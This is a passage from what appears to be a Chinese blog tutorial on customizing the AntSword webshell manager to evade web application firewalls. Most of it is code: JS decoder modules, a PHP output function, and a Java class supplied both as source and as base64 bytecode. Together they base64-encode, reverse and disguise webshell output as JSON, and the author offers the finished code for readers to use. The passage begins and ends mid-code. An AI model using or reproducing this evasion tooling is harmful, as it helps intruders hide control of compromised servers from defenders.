class="comment">/**</span></span><br><span class="line"><span class="comment">      * ext = &#123;</span></span><br><span class="line"><span class="comment">      *   opts: 类型为 Object, Shell 配置</span></span><br><span class="line"><span class="comment">      * &#125;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="keyword">return</span> <span class="string">`yv66vgAAADEAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBAAdyZXZlcnNlAQAaKClMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAHAAgAAAABAAAACQAKAAAAAgABAAsADAABAA0AAAA3AAQAAgAAABcqtwABKrsAAlkrtwADtgAEtgAFtQAGsQAAAAEADgAAAA4AAwAAAAQABAAFABYABgABAA8AEAABAA0AAAAdAAEAAQAAAAUqtAAGsAAAAAEADgAAAAYAAQAAAAkAAQARAAAAAgAS`</span>;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">decode_buff</span>: <span class="function">(<span class="params">buff</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> Buffer.from(buff).reverse();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">       $a = base64_encode($out);</span></span><br><span class="line"><span class="string">        return &#x27;&#123;&quot;message&quot;:&quot;&#x27; .strrev($a) . &#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照php的写法改一下，也改成json的形式<br><img src="/images/antsword-bypasswaf/image-20240306172328193.png" alt="image-20240306172328193"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADEAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBAAdyZXZlcnNlAQAaKClMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAHAAgAAAABAAAACQAKAAAAAgABAAsADAABAA0AAAA3AAQAAgAAABcqtwABKrsAAlkrtwADtgAEtgAFtQAGsQAAAAEADgAAAA4AAwAAAAQABAAFABYABgABAA8AEAABAA0AAAAdAAEAAQAAAAUqtAAGsAAAAAEADgAAAAYAAQAAAAkAAQARAAAAAgAS</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AsoutputReverse</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AsoutputReverse</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.res = (<span class="keyword">new</span> StringBuffer(var1)).reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">字节码的反编译可以清晰的看到定义了一个类,在AsoutputReverse方法中将res逆序。</span><br><span class="line">那么我们仿写一个即可。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">蚁剑原版jspbase64解码</span><br><span class="line">yv66vgAAADEAWQoADgAnCgAaACgJABoAKQgAKgoAKwAsCAAtCAAuCgAUAC8IADAKAAwAMQgAMgcAMwoADAA0BwA1CgA2ADcKAA4AOAgAOQcAOgoAFAA7BwA8CAA9CgAMAD4KAD8AQAgAQQcAQgcAQwEAA3JlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAxCYXNlNjRFbmNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQATQXNvdXRwdXRCYXNlNjQuamF2YQwAHQBEDAAhACIMABsAHAEADGphdmEudmVyc2lvbgcARQwARgAiAQAAAQADMS45DABHAEgBABBqYXZhLnV0aWwuQmFzZTY0DABJAEoBAApnZXRFbmNvZGVyAQAPamF2YS9sYW5nL0NsYXNzDABLAEwBABBqYXZhL2xhbmcvT2JqZWN0BwBNDABOAE8MAFAAUQEADmVuY29kZVRvU3RyaW5nAQACW0IMAFIAUwEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDABUAFUHAFYMAFcAWAEABmVuY29kZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABJzcmMvQXNvdXRwdXRCYXNlNjQBAAMoKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAhnZXRCeXRlcwEABCgpW0IBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwAhABoADgAAAAEAAAAbABwAAAADAAEAHQAeAAEAHwAAAC4AAwACAAAADiq3AAEqKiu2AAK1AAOxAAAAAQAgAAAADgADAAAABAAEAAUADQAGAAEAIQAiAAEAHwAAAPAABgAGAAAAoBIEuAAFTRIGTiwSB7YACJsASxIJuAAKOgQZBBILA70ADLYADRkEA70ADrYADzoFGQW2ABASEQS9AAxZAxMAElO2AA0ZBQS9AA5ZAyu2ABNTtgAPwAAUTqcARBIVuAAKOgQZBAO9AAy2ABYDvQAOtgAXOgUZBbYAEBIYBL0ADFkDEwASU7YADRkFBL0ADlkDK7YAE1O2AA/AABROLbBOK7AAAQAGAJwAnQAZAAEAIAAAADYADQAAAAgABgAKAAkACwASAAwAGQANAC8ADgBXAA8AWgAQAGEAEQBzABIAmwAUAJ0AFQCeABYAAQAjACQAAQAfAAAAHQABAAEAAAAFKrQAA7AAAAABACAAAAAGAAEAAAAbAAEAJQAAAAIAJg==</span><br><span class="line"></span><br><span class="line">解出来的字节为</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AsoutputBase64</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AsoutputBase64</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.res = <span class="keyword">this</span>.Base64Encode(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Base64Encode</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        String var2 = System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String var3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            Class var4;</span><br><span class="line">            Object var5;</span><br><span class="line">            <span class="keyword">if</span> (var2.compareTo(<span class="string">&quot;1.9&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                var4 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">                var5 = var4.getMethod(<span class="string">&quot;getEncoder&quot;</span>).invoke(var4);</span><br><span class="line">                var3 = (String)var5.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">byte</span>[].class).invoke(var5, var1.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                var5 = var4.getDeclaredConstructor().newInstance();</span><br><span class="line">                var3 = (String)var5.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">byte</span>[].class).invoke(var5, var1.getBytes());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跟php一样，先将结果进行base64编码，然后逆序，然后给到json的格式即可,<br>java的代码为下面的结果，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package src;</span><br><span class="line"></span><br><span class="line">public class AsoutputBase64 &#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    public AsoutputBase64(String var1) &#123;</span><br><span class="line">        this.res = this.Base64Encode(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String Base64Encode(String var1) &#123;</span><br><span class="line">        String var2 = System.getProperty(&quot;java.version&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            String var3 = &quot;&quot;;</span><br><span class="line">            Class var4;</span><br><span class="line">            Object var5;</span><br><span class="line">            if (var2.compareTo(&quot;1.9&quot;) &gt;= 0) &#123;</span><br><span class="line">                var4 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">                var5 = var4.getMethod(&quot;getEncoder&quot;).invoke(var4);</span><br><span class="line">                var3 = (String)var5.getClass().getMethod(&quot;encodeToString&quot;, byte[].class).invoke(var5, var1.getBytes());</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                var4 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">                var5 = var4.getDeclaredConstructor().newInstance();</span><br><span class="line">                var3 = (String)var5.getClass().getMethod(&quot;encode&quot;, byte[].class).invoke(var5, var1.getBytes());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return var3;</span><br><span class="line">        &#125; catch (Exception var6) &#123;</span><br><span class="line">            return var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;&#123;\&quot;message\&quot;:\&quot;&quot; + (new StringBuilder(this.res)).reverse().toString().replaceAll(&quot;\\r\\n|\\r|\\n&quot;, &quot;&quot;) + &quot;\&quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我这里没有改类名，一样用，这里return的时候，替换了空行和空格，为什么呢<br>笔者在测试的时候<br><img src="/images/antsword-bypasswaf/image-20240307145654461.png" alt="image-20240307145654461"></p><p>返回结果直接就带回车符，不理解java，所以直接给他替换为空。<br>下面是编译，编译一定要注意，笔者在这里研究了很久，起初编译完的结果，打出去后，还是默认的解码，又去找资料，在<a href="https://yzddmr6.com/posts/antsword-diy-3/%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E6%89%BE%E5%88%B0%E4%BA%86%E7%AD%94%E6%A1%88%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%A4%A7%E5%B8%88%E5%82%85%E8%AF%B4%EF%BC%8C%E8%A6%81%E7%9F%A5%E9%81%93java%E6%98%AF%E5%90%91%E4%B8%8B%E5%85%BC%E5%AE%B9%E7%9A%84%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4jdk1.6%E7%BC%96%E8%AF%91%E5%87%BA%E6%9D%A5%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A81.8%E4%B8%8A%E5%8F%AF%E4%BB%A5%E8%BF%90%E8%A1%8C%EF%BC%8C%E4%BD%86%E6%98%AF1.8%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A81.6%E4%B8%8A%E5%B0%B1%E4%B8%8D%E4%B8%80%E5%AE%9A%E8%B7%91%E5%BE%97%E8%B5%B7%E6%9D%A5%E3%80%82%E6%89%80%E4%BB%A5%E5%9C%A8%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%97%B6%E5%80%99%E9%87%87%E7%94%A8%E4%BA%86jdk1.6%E7%BC%96%E8%AF%91%EF%BC%8C%E4%BE%9D%E8%B5%96%E7%9A%84jar%E5%8C%85%E4%B9%9F%E9%87%87%E7%94%A8%E4%BA%86%E8%B7%9F%E5%86%B0%E8%9D%8E%E7%9B%B8%E5%90%8C%E7%9A%84tomcat7%E7%9A%84jar%E3%80%82">https://yzddmr6.com/posts/antsword-diy-3/这篇文章中找到了答案，这个大师傅说，要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。</a><br>那么笔者的环境是jdk1.8我相信大多数小伙伴的环境应该也是1.8，这里一定要用1.6的环境进行编译。其他版本有编译出来有细微的差别，而且不可以用。<br>随便去网上找一个就可以了，我用的这个,是jdk，不是jre<code>https://blog.csdn.net/sanqima/article/details/44946327</code><br>装好之后我们编译，将上面的java代码命名为java后缀，文件名和主类一致<br><img src="/images/antsword-bypasswaf/image-20240307150357031.png" alt="image-20240307150357031"></p><p>那么直接<code>.\javac.exe AsoutputBase64.java</code>即可，报错不用管<br>然后在<code>base64 -w 0 AsoutputBase64.class</code><br><img src="/images/antsword-bypasswaf/image-20240307150527997.png" alt="image-20240307150527997"></p><p>我这里是git的环境，没有的就拖一下linux，一样的。<br>然后把拿到的结果替换一下<br><img src="/images/antsword-bypasswaf/image-20240307150642027.png" alt="image-20240307150642027"></p><p>下面就正常写，先正则换掉message，然后逆序，最后解base64，data记得替换成buff</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSP::reverse 解码器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">module</span>.exports = &#123;</span><br><span class="line">   <span class="attr">asoutput</span>: <span class="function">(<span class="params">ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * ext = &#123;</span></span><br><span class="line"><span class="comment">      *   opts: 类型为 Object, Shell 配置</span></span><br><span class="line"><span class="comment">      * &#125;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="keyword">return</span> <span class="string">`yv66vgAAADIAeAoADgA3CgAkADgJACQAOQgAOgoAOwA8CAA9CAA+CgAUAD8IAEAKAAwAQQgAQgcAQwoADABEBwBFCgBGAEcKAA4ASAgASQcASgoAFABLBwBMCABNCgAMAE4KAE8AUAgAUQcAUgcAUwoAGgA3CABUCgAaAFUKABoAVgoAGgBXCgAaAFgIAFkKABQAWggAWwcAXAEAA3JlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAxCYXNlNjRFbmNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAEwHAEMHAEUHAFwHAFIBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE0Fzb3V0cHV0QmFzZTY0LmphdmEMACcAXQwAKwAsDAAlACYBAAxqYXZhLnZlcnNpb24HAF4MAF8ALAEAAAEAAzEuOQwAYABhAQAQamF2YS51dGlsLkJhc2U2NAwAYgBjAQAKZ2V0RW5jb2RlcgEAD2phdmEvbGFuZy9DbGFzcwwAZABlAQAQamF2YS9sYW5nL09iamVjdAcAZgwAZwBoDABpAGoBAA5lbmNvZGVUb1N0cmluZwEAAltCDABrAGwBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwAbQBuBwBvDABwAHEBAAZlbmNvZGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAx7Im1lc3NhZ2UiOiIMAHIAcwwAJwAoDAB0AHUMADMANAEAClxyXG58XHJ8XG4MAHYAdwEAAiJ9AQASc3JjL0Fzb3V0cHV0QmFzZTY0AQADKClWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXZlcnNlAQAbKClMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAKcmVwbGFjZUFsbAEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7ACEAJAAOAAAAAQAAACUAJgAAAAMAAQAnACgAAQApAAAALgADAAIAAAAOKrcAASoqK7YAArUAA7EAAAABACoAAAAOAAMAAAAGAAQABwANAAgAAQArACwAAQApAAABGQAGAAYAAACgEgS4AAVNEgZOLBIHtgAImwBLEgm4AAo6BBkEEgsDvQAMtgANGQQDvQAOtgAPOgUZBbYAEBIRBL0ADFkDEwASU7YADRkFBL0ADlkDK7YAE1O2AA/AABROpwBEEhW4AAo6BBkEA70ADLYAFgO9AA62ABc6BRkFtgAQEhgEvQAMWQMTABJTtgANGQUEvQAOWQMrtgATU7YAD8AAFE4tsE4rsAABAAYAnACdABkAAgAqAAAAMgAMAAAACwAGAA4ACQARABIAEgAZABMALwAUAFoAFgBhABcAcwAYAJsAGwCdABwAngAdAC0AAAAnAAP9AFoHAC4HAC79AEAHAC8HADD/AAEAAwcAMQcALgcALgABBwAyAAEAMwA0AAEAKQAAAEgABAABAAAAMLsAGlm3ABsSHLYAHbsAGlkqtAADtwAetgAftgAgEiESBrYAIrYAHRIjtgAdtgAgsAAAAAEAKgAAAAYAAQAAACIAAQA1AAAAAgA2`</span>;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">decode_buff</span>: <span class="function">(<span class="params">buff</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> res = Buffer.from(buff.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这样话再去执行即可，<br><img src="/images/antsword-bypasswaf/image-20240307162737769.png" alt="image-20240307162737769"></p><p>这里可以看到message的前面还是有字符，有点丑陋，<br>我们在jsp下的index.js中给他修改为空，那么就可以了。<br><img src="/images/antsword-bypasswaf/image-20240307162904197.png" alt="image-20240307162904197"></p><p><img src="/images/antsword-bypasswaf/image-20240307162650259.png" alt="image-20240307162650259"></p><p>解码和编码先写到这里吧，相信小伙伴们已经知道是怎么回事了，可以照着自己的思路更改了。<br>放下代码方便使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">webshell</span><br><span class="line"></span><br><span class="line"></span><br><span 